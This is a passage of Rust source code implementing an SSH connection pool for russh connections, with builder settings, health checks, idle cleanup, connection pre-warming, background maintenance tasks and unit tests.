  self\n    }\n\n    /// Set maximum total connections\n    pub fn max_total_connections(mut self, max: usize) -\u003e Self {\n        self.max_total_connections = max;\n        self\n    }\n\n    /// Set idle timeout\n    pub fn idle_timeout(mut self, timeout: Duration) -\u003e Self {\n        self.idle_timeout = timeout;\n        self\n    }\n\n    /// Set health check interval\n    pub fn health_check_interval(mut self, interval: Duration) -\u003e Self {\n        self.health_check_interval = interval;\n        self\n    }\n\n    /// Enable or disable health checks\n    pub fn enable_health_checks(mut self, enable: bool) -\u003e Self {\n        self.enable_health_checks = enable;\n        self\n    }\n\n    /// Set health check timeout\n    pub fn health_check_timeout(mut self, timeout: Duration) -\u003e Self {\n        self.health_check_timeout = timeout;\n        self\n    }\n\n    /// Set maximum reconnection attempts\n    pub fn max_reconnect_attempts(mut self, attempts: u32) -\u003e Self {\n        self.max_reconnect_attempts = attempts;\n        self\n    }\n\n    /// Set base reconnection delay (for exponential backoff)\n    pub fn reconnect_delay(mut self, delay: Duration) -\u003e Self {\n        self.reconnect_delay = delay;\n        self\n    }\n\n    /// Set minimum connections per host (for pre-warming)\n    pub fn min_connections_per_host(mut self, min: usize) -\u003e Self {\n        self.min_connections_per_host = min;\n        self\n    }\n\n    /// Set pre-warm maintenance interval\n    pub fn prewarm_maintenance_interval(mut self, interval: Duration) -\u003e Self {\n        self.prewarm_maintenance_interval = interval;\n        self\n    }\n\n    /// Set pre-warm retry attempts\n    pub fn prewarm_retry_attempts(mut self, attempts: u32) -\u003e Self {\n        self.prewarm_retry_attempts = attempts;\n        self\n    }\n\n    /// Set pre-warm retry delay\n    pub fn prewarm_retry_delay(mut self, delay: Duration) -\u003e Self {\n        self.prewarm_retry_delay = delay;\n        self\n    }\n}\n\n/// A pooled connection wrapper that tracks usage and health\nstruct PooledConnection {\n    /// The actual connection\n    connection: Arc\u003cRusshConnection\u003e,\n    /// When the connection was created (as nanos since pool start for atomic ops)\n    created_at_nanos: u64,\n    /// When the connection was last used (as nanos since pool start for lock-free updates)\n    last_used_nanos: AtomicU64,\n    /// Number of times this connection has been borrowed\n    borrow_count: AtomicUsize,\n    /// Whether the connection is currently in use\n    in_use: AtomicBool,\n    /// Connection parameters for reconnection\n    host: String,\n    port: u16,\n    user: String,\n    host_config: Option\u003cHostConfig\u003e,\n    /// Whether this connection was created via pre-warming\n    is_prewarmed: bool,\n}\n\nimpl PooledConnection {\n    /// Create a new pooled connection\n    #[allow(dead_code)]\n    fn new(\n        connection: RusshConnection,\n        host: String,\n        port: u16,\n        user: String,\n        host_config: Option\u003cHostConfig\u003e,\n    ) -\u003e Self {\n        Self::with_prewarm_flag(connection, host, port, user, host_config, false)\n    }\n\n    /// Create a new pooled connection with pre-warm flag\n    fn with_prewarm_flag(\n        connection: RusshConnection,\n        host: String,\n        port: u16,\n        user: String,\n        host_config: Option\u003cHostConfig\u003e,\n        is_prewarmed: bool,\n    ) -\u003e Self {\n        let now_nanos = nanos_since_start();\n        Self {\n            connection: Arc::new(connection),\n            created_at_nanos: now_nanos,\n            last_used_nanos: AtomicU64::new(now_nanos),\n            borrow_count: AtomicUsize::new(0),\n            in_use: AtomicBool::new(false),\n            host,\n            port,\n            user,\n            host_config,\n            is_prewarmed,\n        }\n    }\n\n    /// Check if the connection is alive\n    async fn is_alive(\u0026self) -\u003e bool {\n        self.connection.is_alive().await\n    }\n\n    /// Check if the connection is alive with a timeout\n    async fn is_alive_with_timeout(\u0026self, timeout: Duration) -\u003e bool {\n        match tokio::time::timeout(timeout, self.connection.is_alive()).await {\n            Ok(result) =\u003e result,\n            Err(_) =\u003e {\n                warn!(\n                    host = %self.host,\n                    port = %self.port,\n                    \"Health check timed out after {:?}\",\n                    timeout\n                );\n                false\n            }\n        }\n    }\n\n    /// Mark the connection as in use (lock-free fast path)\n    #[inline(always)]\n    fn acquire(\u0026self) -\u003e bool {\n        if self\n            .in_use\n            .compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed)\n            .is_ok()\n        {\n            self.borrow_count.fetch_add(1, Ordering::Relaxed);\n            true\n        } else {\n            false\n        }\n    }\n\n    /// Release the connection back to the pool (lock-free)\n    #[inline(always)]\n    fn release(\u0026self) {\n        self.last_used_nanos\n            .store(nanos_since_start(), Ordering::Relaxed);\n        self.in_use.store(false, Ordering::Release);\n    }\n\n    /// Check if the connection has been idle for too long (lock-free)\n    #[inline(always)]\n    fn is_idle(\u0026self, timeout: Duration) -\u003e bool {\n        let last_used = self.last_used_nanos.load(Ordering::Relaxed);\n        let now = nanos_since_start();\n        let elapsed_nanos = now.saturating_sub(last_used);\n        elapsed_nanos \u003e timeout.as_nanos() as u64\n    }\n\n    /// Get the underlying connection\n    #[inline(always)]\n    fn get_connection(\u0026self) -\u003e Arc\u003cRusshConnection\u003e {\n        Arc::clone(\u0026self.connection)\n    }\n\n    /// Get connection age\n    fn age(\u0026self) -\u003e Duration {\n        let now = nanos_since_start();\n        let elapsed = now.saturating_sub(self.created_at_nanos);\n        Duration::from_nanos(elapsed)\n    }\n}\n\nimpl Clone for PooledConnection {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            connection: Arc::clone(\u0026self.connection),\n            created_at_nanos: self.created_at_nanos,\n            last_used_nanos: AtomicU64::new(nanos_since_start()),\n            borrow_count: AtomicUsize::new(self.borrow_count.load(Ordering::SeqCst)),\n            in_use: AtomicBool::new(self.in_use.load(Ordering::SeqCst)),\n            host: self.host.clone(),\n            port: self.port,\n            user: self.user.clone(),\n            host_config: self.host_config.clone(),\n            is_prewarmed: self.is_prewarmed,\n        }\n    }\n}\n\n/// Statistics for the connection pool\n#[derive(Debug, Clone, Default)]\npub struct PoolStats {\n    /// Total number of connections in the pool\n    pub total_connections: usize,\n    /// Number of connections currently in use\n    pub active_connections: usize,\n    /// Number of idle connections\n    pub idle_connections: usize,\n    /// Number of connection hits (reused connections)\n    pub hits: usize,\n    /// Number of connection misses (new connections created)\n    pub misses: usize,\n    /// Number of failed connection attempts\n    pub failures: usize,\n    /// Number of connections closed due to idle timeout\n    pub idle_timeouts: usize,\n    /// Number of connections closed due to health check failure\n    pub health_check_failures: usize,\n    /// Number of connections created via pre-warming\n    pub prewarmed_connections: usize,\n    /// Number of connections created on-demand\n    pub ondemand_connections: usize,\n    /// Number of failed pre-warm attempts\n    pub prewarm_failures: usize,\n}\n\n/// Thread-safe connection pool for Russh SSH connections\npub struct RusshConnectionPool {\n    /// Pool configuration\n    config: PoolConfig,\n    /// Global connection configuration\n    connection_config: Arc\u003cConnectionConfig\u003e,\n    /// Pooled connections by host key\n    connections: Arc\u003cRwLock\u003cHashMap\u003cString, Vec\u003cArc\u003cPooledConnection\u003e\u003e\u003e\u003e\u003e,\n    /// Pool statistics\n    stats: RwLock\u003cPoolStats\u003e,\n    /// Whether the pool is shutting down\n    shutdown: AtomicBool,\n}\n\nimpl RusshConnectionPool {\n    /// Create a new connection pool with default configuration\n    pub fn new(connection_config: ConnectionConfig) -\u003e Self {\n        Self::with_config(connection_config, PoolConfig::default())\n    }\n\n    /// Create a new connection pool with custom configuration\n    pub fn with_config(connection_config: ConnectionConfig, pool_config: PoolConfig) -\u003e Self {\n        debug!(\n            max_per_host = %pool_config.max_connections_per_host,\n            min_per_host = %pool_config.min_connections_per_host,\n            max_total = %pool_config.max_total_connections,\n            idle_timeout = ?pool_config.idle_timeout,\n            \"Creating new RusshConnectionPool\"\n        );\n        Self {\n            config: pool_config,\n            connection_config: Arc::new(connection_config),\n            connections: Arc::new(RwLock::new(HashMap::new())),\n            stats: RwLock::new(PoolStats::default()),\n            shutdown: AtomicBool::new(false),\n        }\n    }\n\n    fn connection_key(host: \u0026str, port: u16, user: \u0026str) -\u003e String {\n        format!(\"ssh://{}@{}:{}\", user, host, port)\n    }\n\n    pub async fn get(\n        \u0026self,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n    ) -\u003e ConnectionResult\u003cArc\u003cRusshConnection\u003e\u003e {\n        self.get_with_config(host, port, user, None).await\n    }\n\n    pub async fn get_with_config(\n        \u0026self,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n    ) -\u003e ConnectionResult\u003cArc\u003cRusshConnection\u003e\u003e {\n        if self.shutdown.load(Ordering::SeqCst) {\n            return Err(ConnectionError::ConnectionClosed);\n        }\n\n        let key = Self::connection_key(host, port, user);\n\n        if let Some(conn) = self.try_get_existing(\u0026key).await {\n            return Ok(conn.connection());\n        }\n\n        let handle = self\n            .create_new_connection(host, port, user, host_config, false)\n            .await?;\n        Ok(handle.connection())\n    }\n\n    pub async fn get_or_create(\n        \u0026self,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n    ) -\u003e ConnectionResult\u003cPooledConnectionHandle\u003e {\n        if self.shutdown.load(Ordering::SeqCst) {\n            return Err(ConnectionError::ConnectionClosed);\n        }\n\n        let key = Self::connection_key(host, port, user);\n\n        if let Some(conn) = self.try_get_existing(\u0026key).await {\n            return Ok(conn);\n        }\n\n        self.create_new_connection(host, port, user, host_config, false)\n            .await\n    }\n\n    async fn try_get_existing(\u0026self, key: \u0026str) -\u003e Option\u003cPooledConnectionHandle\u003e {\n        let connections = self.connections.read().await;\n\n        if let Some(host_connections) = connections.get(key) {\n            for pooled in host_connections {\n                if pooled.acquire() {\n                    if pooled.is_alive().await {\n                        {\n                            let mut stats = self.stats.write().await;\n                            stats.hits += 1;\n                            stats.active_connections += 1;\n                        }\n                        debug!(key = %key, \"Reusing existing connection from pool\");\n                        return Some(PooledConnectionHandle::new(Arc::clone(pooled), self));\n                    }\n                    pooled.release();\n                    warn!(key = %key, \"Found dead connection in pool, will be cleaned up\");\n                }\n            }\n        }\n\n        None\n    }\n\n    async fn create_new_connection(\n        \u0026self,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n        is_prewarmed: bool,\n    ) -\u003e ConnectionResult\u003cPooledConnectionHandle\u003e {\n        let key = Self::connection_key(host, port, user);\n\n        {\n            let connections = self.connections.read().await;\n            if let Some(host_connections) = connections.get(\u0026key) {\n                if host_connections.len() \u003e= self.config.max_connections_per_host {\n                    drop(connections);\n                    return self.wait_for_connection(\u0026key).await;\n                }\n            }\n        }\n\n        {\n            let stats = self.stats.read().await;\n            if stats.total_connections \u003e= self.config.max_total_connections {\n                drop(stats);\n                return self.wait_for_connection(\u0026key).await;\n            }\n        }\n\n        debug!(host = %host, port = %port, user = %user, \"Creating new SSH connection\");\n\n        let connection = RusshConnection::connect(\n            host,\n            port,\n            user,\n            host_config.clone(),\n            \u0026self.connection_config,\n        )\n        .await?;\n\n        let pooled = Arc::new(PooledConnection::with_prewarm_flag(\n            connection,\n            host.to_string(),\n            port,\n            user.to_string(),\n            host_config,\n            is_prewarmed,\n        ));\n\n        pooled.acquire();\n\n        {\n            let mut connections = self.connections.write().await;\n            connections\n                .entry(key.clone())\n                .or_insert_with(Vec::new)\n                .push(Arc::clone(\u0026pooled));\n        }\n\n        {\n            let mut stats = self.stats.write().await;\n            stats.misses += 1;\n            stats.total_connections += 1;\n            stats.active_connections += 1;\n            if is_prewarmed {\n                stats.prewarmed_connections += 1;\n            } else {\n                stats.ondemand_connections += 1;\n            }\n        }\n\n        info!(key = %key, prewarmed = %is_prewarmed, \"Created new connection and added to pool\");\n        Ok(PooledConnectionHandle::new(pooled, self))\n    }\n\n    async fn wait_for_connection(\u0026self, key: \u0026str) -\u003e ConnectionResult\u003cPooledConnectionHandle\u003e {\n        let timeout = Duration::from_secs(30);\n        let start = Instant::now();\n        let check_interval = Duration::from_millis(100);\n\n        while start.elapsed() \u003c timeout {\n            if let Some(conn) = self.try_get_existing(key).await {\n                return Ok(conn);\n            }\n            tokio::time::sleep(check_interval).await;\n        }\n\n        Err(ConnectionError::Timeout(30))\n    }\n\n    pub async fn release(\u0026self, host: \u0026str, port: u16, user: \u0026str) {\n        let key = Self::connection_key(host, port, user);\n        trace!(key = %key, \"Releasing connection back to pool\");\n\n        let connections = self.connections.read().await;\n\n        if let Some(host_connections) = connections.get(\u0026key) {\n            for pooled in host_connections {\n                if pooled.in_use.load(Ordering::SeqCst) {\n                    pooled.release();\n                    {\n                        let mut stats = self.stats.write().await;\n                        stats.active_connections = stats.active_connections.saturating_sub(1);\n                        stats.idle_connections += 1;\n                    }\n                    debug!(key = %key, \"Connection released back to pool\");\n                    return;\n                }\n            }\n        }\n\n        trace!(key = %key, \"Connection not found in pool during release\");\n    }\n\n    pub async fn health_check(\u0026self) {\n        if !self.config.enable_health_checks {\n            return;\n        }\n\n        let keys: Vec\u003cString\u003e = {\n            let connections = self.connections.read().await;\n            connections.keys().cloned().collect()\n        };\n\n        for key in keys {\n            self.health_check_host(\u0026key).await;\n        }\n    }\n\n    async fn health_check_host(\u0026self, key: \u0026str) {\n        let connections_to_check: Vec\u003cArc\u003cPooledConnection\u003e\u003e = {\n            let connections = self.connections.read().await;\n            connections.get(key).cloned().unwrap_or_default()\n        };\n\n        let mut dead_connections = Vec::new();\n\n        for pooled in connections_to_check {\n            if !pooled.in_use.load(Ordering::SeqCst) \u0026\u0026 !pooled.is_alive().await {\n                dead_connections.push(pooled);\n            }\n        }\n\n        if !dead_connections.is_empty() {\n            let mut connections = self.connections.write().await;\n            if let Some(host_connections) = connections.get_mut(key) {\n                let before_len = host_connections.len();\n                host_connections\n                    .retain(|c| !dead_connections.iter().any(|dead| Arc::ptr_eq(c, dead)));\n                let removed = before_len - host_connections.len();\n\n                if removed \u003e 0 {\n                    warn!(key = %key, count = %removed, \"Removed dead connections from pool\");\n                    let mut stats = self.stats.write().await;\n                    stats.health_check_failures += removed;\n                    stats.total_connections = stats.total_connections.saturating_sub(removed);\n                }\n            }\n        }\n    }\n\n    pub async fn cleanup_idle(\u0026self) {\n        let timeout = self.config.idle_timeout;\n        let keys: Vec\u003cString\u003e = {\n            let connections = self.connections.read().await;\n            connections.keys().cloned().collect()\n        };\n\n        for key in keys {\n            self.cleanup_idle_host(\u0026key, timeout).await;\n        }\n    }\n\n    async fn cleanup_idle_host(\u0026self, key: \u0026str, timeout: Duration) {\n        let connections_to_check: Vec\u003cArc\u003cPooledConnection\u003e\u003e = {\n            let connections = self.connections.read().await;\n            connections.get(key).cloned().unwrap_or_default()\n        };\n\n        let mut idle_connections = Vec::new();\n\n        for pooled in connections_to_check {\n            if !pooled.in_use.load(Ordering::SeqCst) \u0026\u0026 pooled.is_idle(timeout) {\n                idle_connections.push(pooled);\n            }\n        }\n\n        if !idle_connections.is_empty() {\n            let mut connections = self.connections.write().await;\n            if let Some(host_connections) = connections.get_mut(key) {\n                let min_to_keep = self.config.min_connections_per_host.max(1);\n                let max_to_remove = host_connections.len().saturating_sub(min_to_keep);\n                let to_remove = idle_connections.len().min(max_to_remove);\n\n                if to_remove \u003e 0 {\n                    let before_len = host_connections.len();\n                    let mut removed = 0;\n\n                    host_connections.retain(|c| {\n                        if removed \u003e= to_remove {\n                            return true;\n                        }\n                        let should_remove =\n                            idle_connections.iter().any(|idle| Arc::ptr_eq(c, idle));\n                        if should_remove {\n                            removed += 1;\n                        }\n                        !should_remove\n                    });\n\n                    let actual_removed = before_len - host_connections.len();\n                    if actual_removed \u003e 0 {\n                        debug!(key = %key, count = %actual_removed, \"Cleaned up idle connections\");\n                        let mut stats = self.stats.write().await;\n                        stats.idle_timeouts += actual_removed;\n                        stats.total_connections =\n                            stats.total_connections.saturating_sub(actual_removed);\n                        stats.idle_connections =\n                            stats.idle_connections.saturating_sub(actual_removed);\n                    }\n                }\n            }\n        }\n    }\n\n    pub async fn stats(\u0026self) -\u003e PoolStats {\n        self.stats.read().await.clone()\n    }\n\n    pub async fn connections_for_host(\u0026self, host: \u0026str, port: u16, user: \u0026str) -\u003e usize {\n        let key = Self::connection_key(host, port, user);\n        let connections = self.connections.read().await;\n        connections.get(\u0026key).map(|v| v.len()).unwrap_or(0)\n    }\n\n    pub async fn close_all(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        info!(\"Closing all connections in pool\");\n        self.shutdown.store(true, Ordering::SeqCst);\n\n        let all_connections: Vec\u003c(String, Vec\u003cArc\u003cPooledConnection\u003e\u003e)\u003e = {\n            let mut connections = self.connections.write().await;\n            connections.drain().collect()\n        };\n\n        let mut close_errors = Vec::new();\n\n        for (key, pooled_conns) in all_connections {\n            for pooled in pooled_conns {\n                debug!(key = %key, \"Closing pooled connection\");\n                if let Err(e) = pooled.connection.close().await {\n                    warn!(key = %key, error = %e, \"Error closing connection\");\n                    close_errors.push(e);\n                }\n            }\n        }\n\n        {\n            let mut stats = self.stats.write().await;\n            *stats = PoolStats::default();\n        }\n\n        if close_errors.is_empty() {\n            info!(\"All pooled connections closed successfully\");\n            Ok(())\n        } else {\n            warn!(\"Connection pool closed with {} errors\", close_errors.len());\n            Err(close_errors.remove(0))\n        }\n    }\n\n    pub async fn shutdown(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        self.close_all().await\n    }\n\n    /// Pre-warm connections for a specific host\n    pub async fn prewarm(\n        self: \u0026Arc\u003cSelf\u003e,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        count: usize,\n        host_config: Option\u003cHostConfig\u003e,\n    ) -\u003e PrewarmResult {\n        if self.shutdown.load(Ordering::SeqCst) {\n            return PrewarmResult {\n                success: 0,\n                failures: count,\n            };\n        }\n\n        let key = Self::connection_key(host, port, user);\n        let current_count = self.connections_for_host(host, port, user).await;\n        let max_allowed = self\n            .config\n            .max_connections_per_host\n            .saturating_sub(current_count);\n        let to_create = count.min(max_allowed);\n\n        if to_create == 0 {\n            debug!(key = %key, current = %current_count, max = %self.config.max_connections_per_host, \"Host already at maximum connections, skipping pre-warm\");\n            return PrewarmResult {\n                success: 0,\n                failures: 0,\n            };\n        }\n\n        info!(key = %key, count = %to_create, \"Pre-warming connections\");\n\n        let mut handles = Vec::with_capacity(to_create);\n\n        for _ in 0..to_create {\n            let pool = Arc::clone(self);\n            let host = host.to_string();\n            let user = user.to_string();\n            let hc = host_config.clone();\n\n            handles.push(tokio::spawn(async move {\n                pool.create_prewarm_connection(\u0026host, port, \u0026user, hc).await\n            }));\n        }\n\n        let mut success = 0;\n        let mut failures = 0;\n\n        for handle in handles {\n            match handle.await {\n                Ok(Ok(())) =\u003e success += 1,\n                Ok(Err(e)) =\u003e {\n                    warn!(key = %key, error = %e, \"Pre-warm connection failed\");\n                    failures += 1;\n                }\n                Err(e) =\u003e {\n                    warn!(key = %key, error = %e, \"Pre-warm task panicked\");\n                    failures += 1;\n                }\n            }\n        }\n\n        {\n            let mut stats = self.stats.write().await;\n            stats.prewarm_failures += failures;\n        }\n\n        info!(key = %key, success = %success, failures = %failures, \"Pre-warming complete\");\n\n        PrewarmResult { success, failures }\n    }\n\n    async fn create_prewarm_connection(\n        \u0026self,\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let key = Self::connection_key(host, port, user);\n        let retry_attempts = self.config.prewarm_retry_attempts;\n        let retry_delay = self.config.prewarm_retry_delay;\n\n        let mut last_error = None;\n\n        for attempt in 0..=retry_attempts {\n            if attempt \u003e 0 {\n                tokio::time::sleep(retry_delay).await;\n                debug!(key = %key, attempt = %attempt, \"Retrying pre-warm connection\");\n            }\n\n            {\n                let connections = self.connections.read().await;\n                if let Some(host_connections) = connections.get(\u0026key) {\n                    if host_connections.len() \u003e= self.config.max_connections_per_host {\n                        return Ok(());\n                    }\n                }\n            }\n\n            {\n                let stats = self.stats.read().await;\n                if stats.total_connections \u003e= self.config.max_total_connections {\n                    return Ok(());\n                }\n            }\n\n            match RusshConnection::connect(\n                host,\n                port,\n                user,\n                host_config.clone(),\n                \u0026self.connection_config,\n            )\n            .await\n            {\n                Ok(connection) =\u003e {\n                    let pooled = Arc::new(PooledConnection::with_prewarm_flag(\n                        connection,\n                        host.to_string(),\n                        port,\n                        user.to_string(),\n                        host_config,\n                        true,\n                    ));\n\n                    {\n                        let mut connections = self.connections.write().await;\n                        connections\n                            .entry(key.clone())\n                            .or_insert_with(Vec::new)\n                            .push(pooled);\n                    }\n\n                    {\n                        let mut stats = self.stats.write().await;\n                        stats.total_connections += 1;\n                        stats.idle_connections += 1;\n                        stats.prewarmed_connections += 1;\n                    }\n\n                    debug!(key = %key, \"Pre-warmed connection added to pool\");\n                    return Ok(());\n                }\n                Err(e) =\u003e {\n                    last_error = Some(e);\n                }\n            }\n        }\n\n        Err(last_error.unwrap_or_else(|| {\n            ConnectionError::ConnectionFailed(\"Pre-warm failed after retries\".to_string())\n        }))\n    }\n\n    /// Perform a health-check ping on idle connections for a host\n    pub async fn health_ping(\u0026self, host: \u0026str, port: u16, user: \u0026str) -\u003e bool {\n        let key = Self::connection_key(host, port, user);\n        let timeout = self.config.health_check_timeout;\n\n        let connections = self.connections.read().await;\n        if let Some(host_connections) = connections.get(\u0026key) {\n            for pooled in host_connections {\n                if !pooled.in_use.load(Ordering::SeqCst) {\n                    if pooled.is_alive_with_timeout(timeout).await {\n                        return true;\n                    }\n                }\n            }\n        }\n\n        false\n    }\n\n    async fn maintain_minimum_connections(self: \u0026Arc\u003cSelf\u003e) {\n        if self.config.min_connections_per_host == 0 {\n            return;\n        }\n\n        let hosts: Vec\u003c(String, u16, String, Option\u003cHostConfig\u003e)\u003e = {\n            let connections = self.connections.read().await;\n            connections\n                .values()\n                .filter_map(|conns| {\n                    conns.first().map(|c| {\n                        (\n                            c.host.clone(),\n                            c.port,\n                            c.user.clone(),\n                            c.host_config.clone(),\n                        )\n                    })\n                })\n                .collect()\n        };\n\n        for (host, port, user, host_config) in hosts {\n            let current = self.connections_for_host(\u0026host, port, \u0026user).await;\n            if current \u003c self.config.min_connections_per_host {\n                let needed = self.config.min_connections_per_host - current;\n                debug!(host = %host, port = %port, user = %user, current = %current, needed = %needed, \"Replenishing connections to maintain minimum\");\n                let _ = self.prewarm(\u0026host, port, \u0026user, needed, host_config).await;\n            }\n        }\n    }\n\n    /// Start background maintenance tasks\n    pub fn start_maintenance(self: \u0026Arc\u003cSelf\u003e) {\n        let pool = Arc::clone(self);\n        let health_interval = pool.config.health_check_interval;\n        let idle_timeout = pool.config.idle_timeout;\n        let prewarm_interval = pool.config.prewarm_maintenance_interval;\n        let min_connections = pool.config.min_connections_per_host;\n\n        if pool.config.enable_health_checks {\n            let pool_clone = Arc::clone(\u0026pool);\n            tokio::spawn(async move {\n                let mut interval = tokio::time::interval(health_interval);\n                loop {\n                    interval.tick().await;\n                    if pool_clone.shutdown.load(Ordering::SeqCst) {\n                        break;\n                    }\n                    pool_clone.health_check().await;\n                }\n            });\n        }\n\n        let pool_clone = Arc::clone(\u0026pool);\n        tokio::spawn(async move {\n            let cleanup_interval = idle_timeout / 2;\n            let mut interval = tokio::time::interval(cleanup_interval);\n            loop {\n                interval.tick().await;\n                if pool_clone.shutdown.load(Ordering::SeqCst) {\n                    break;\n                }\n                pool_clone.cleanup_idle().await;\n            }\n        });\n\n        if min_connections \u003e 0 {\n            let pool_clone = Arc::clone(\u0026pool);\n            tokio::spawn(async move {\n                let mut interval = tokio::time::interval(prewarm_interval);\n                loop {\n                    interval.tick().await;\n                    if pool_clone.shutdown.load(Ordering::SeqCst) {\n                        break;\n                    }\n                    pool_clone.maintain_minimum_connections().await;\n                }\n            });\n        }\n    }\n}\n\n/// A handle to a pooled connection that releases it back to the pool on drop\npub struct PooledConnectionHandle {\n    pooled: Arc\u003cPooledConnection\u003e,\n    host: String,\n    port: u16,\n    user: String,\n    released: AtomicBool,\n}\n\nimpl PooledConnectionHandle {\n    fn new(pooled: Arc\u003cPooledConnection\u003e, _pool: \u0026RusshConnectionPool) -\u003e Self {\n        Self {\n            host: pooled.host.clone(),\n            port: pooled.port,\n            user: pooled.user.clone(),\n            pooled,\n            released: AtomicBool::new(false),\n        }\n    }\n\n    pub fn connection(\u0026self) -\u003e Arc\u003cRusshConnection\u003e {\n        self.pooled.get_connection()\n    }\n\n    pub fn as_connection(\u0026self) -\u003e Arc\u003cdyn Connection + Send + Sync\u003e {\n        self.pooled.get_connection() as Arc\u003cdyn Connection + Send + Sync\u003e\n    }\n\n    pub fn age(\u0026self) -\u003e Duration {\n        self.pooled.age()\n    }\n\n    pub fn borrow_count(\u0026self) -\u003e usize {\n        self.pooled.borrow_count.load(Ordering::SeqCst)\n    }\n\n    pub fn host(\u0026self) -\u003e \u0026str {\n        \u0026self.host\n    }\n\n    pub fn port(\u0026self) -\u003e u16 {\n        self.port\n    }\n\n    pub fn user(\u0026self) -\u003e \u0026str {\n        \u0026self.user\n    }\n\n    pub fn is_prewarmed(\u0026self) -\u003e bool {\n        self.pooled.is_prewarmed\n    }\n\n    pub fn mark_released(\u0026self) {\n        self.released.store(true, Ordering::SeqCst);\n    }\n\n    fn release_sync(\u0026self) {\n        if !self.released.swap(true, Ordering::SeqCst) {\n            self.pooled.in_use.store(false, Ordering::SeqCst);\n        }\n    }\n}\n\nimpl Drop for PooledConnectionHandle {\n    fn drop(\u0026mut self) {\n        self.release_sync();\n    }\n}\n\n/// Builder for creating a connection pool with custom settings\npub struct RusshConnectionPoolBuilder {\n    pool_config: PoolConfig,\n    connection_config: ConnectionConfig,\n}\n\nimpl RusshConnectionPoolBuilder {\n    pub fn new() -\u003e Self {\n        Self {\n            pool_config: PoolConfig::default(),\n            connection_config: ConnectionConfig::default(),\n        }\n    }\n\n    pub fn connection_config(mut self, config: ConnectionConfig) -\u003e Self {\n        self.connection_config = config;\n        self\n    }\n\n    pub fn max_connections_per_host(mut self, max: usize) -\u003e Self {\n        self.pool_config.max_connections_per_host = max;\n        self\n    }\n\n    pub fn min_connections_per_host(mut self, min: usize) -\u003e Self {\n        self.pool_config.min_connections_per_host = min;\n        self\n    }\n\n    pub fn max_total_connections(mut self, max: usize) -\u003e Self {\n        self.pool_config.max_total_connections = max;\n        self\n    }\n\n    pub fn idle_timeout(mut self, timeout: Duration) -\u003e Self {\n        self.pool_config.idle_timeout = timeout;\n        self\n    }\n\n    pub fn health_check_interval(mut self, interval: Duration) -\u003e Self {\n        self.pool_config.health_check_interval = interval;\n        self\n    }\n\n    pub fn enable_health_checks(mut self, enable: bool) -\u003e Self {\n        self.pool_config.enable_health_checks = enable;\n        self\n    }\n\n    pub fn max_reconnect_attempts(mut self, attempts: u32) -\u003e Self {\n        self.pool_config.max_reconnect_attempts = attempts;\n        self\n    }\n\n    pub fn reconnect_delay(mut self, delay: Duration) -\u003e Self {\n        self.pool_config.reconnect_delay = delay;\n        self\n    }\n\n    pub fn prewarm_maintenance_interval(mut self, interval: Duration) -\u003e Self {\n        self.pool_config.prewarm_maintenance_interval = interval;\n        self\n    }\n\n    pub fn build(self) -\u003e Arc\u003cRusshConnectionPool\u003e {\n        let pool = RusshConnectionPool::with_config(self.connection_config, self.pool_config);\n        Arc::new(pool)\n    }\n\n    pub fn build_with_maintenance(self) -\u003e Arc\u003cRusshConnectionPool\u003e {\n        let pool = self.build();\n        pool.start_maintenance();\n        pool\n    }\n}\n\nimpl Default for RusshConnectionPoolBuilder {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_pool_config_default() {\n        let config = PoolConfig::default();\n        assert_eq!(config.max_connections_per_host, 5);\n        assert_eq!(config.min_connections_per_host, 0);\n        assert_eq!(config.max_total_connections, 50);\n        assert_eq!(config.idle_timeout, Duration::from_secs(300));\n        assert!(config.enable_health_checks);\n    }\n\n    #[test]\n    fn test_pool_config_builder() {\n        let config = PoolConfig::new()\n            .max_connections_per_host(10)\n            .min_connections_per_host(2)\n            .max_total_connections(100)\n            .idle_timeout(Duration::from_secs(600))\n            .enable_health_checks(false);\n\n        assert_eq!(config.max_connections_per_host, 10);\n        assert_eq!(config.min_connections_per_host, 2);\n        assert_eq!(config.max_total_connections, 100);\n        assert_eq!(config.idle_timeout, Duration::from_secs(600));\n        assert!(!config.enable_health_checks);\n    }\n\n    #[test]\n    fn test_connection_key() {\n        let key = RusshConnectionPool::connection_key(\"example.com\", 22, \"admin\");\n        assert_eq!(key, \"ssh://admin@example.com:22\");\n    }\n\n    #[test]\n    fn test_pool_stats_default() {\n        let stats = PoolStats::default();\n        assert_eq!(stats.total_connections, 0);\n        assert_eq!(stats.active_connections, 0);\n        assert_eq!(stats.idle_connections, 0);\n        assert_eq!(stats.hits, 0);\n        assert_eq!(stats.misses, 0);\n        assert_eq!(stats.prewarmed_connections, 0);\n        assert_eq!(stats.ondemand_connections, 0);\n        assert_eq!(stats.prewarm_failures, 0);\n    }\n\n    #[test]\n    fn test_prewarm_result_default() {\n        let result = PrewarmResult::default();\n        assert_eq!(result.success, 0);\n        assert_eq!(result.failures, 0);\n    }\n\n    #[tokio::test]\n    async fn test_pool_creation() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        let stats = pool.stats().await;\n        assert_eq!(stats.total_connections, 0);\n    }\n\n    #[test]\n    fn test_pool_builder() {\n        let pool = RusshConnectionPoolBuilder::new()\n            .max_connections_per_host(3)\n            .min_connections_per_host(1)\n            .max_total_connections(30)\n            .idle_timeout(Duration::from_secs(120))\n            .enable_health_checks(true)\n            .build();\n\n        assert!(!pool.shutdown.load(Ordering::SeqCst));\n    }\n\n    #[tokio::test]\n    async fn test_pool_close_all() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        let result = pool.close_all().await;\n        assert!(result.is_ok());\n        assert!(pool.shutdown.load(Ordering::SeqCst));\n    }\n\n    #[tokio::test]\n    async fn test_pool_release_nonexistent() {\n        let pool = 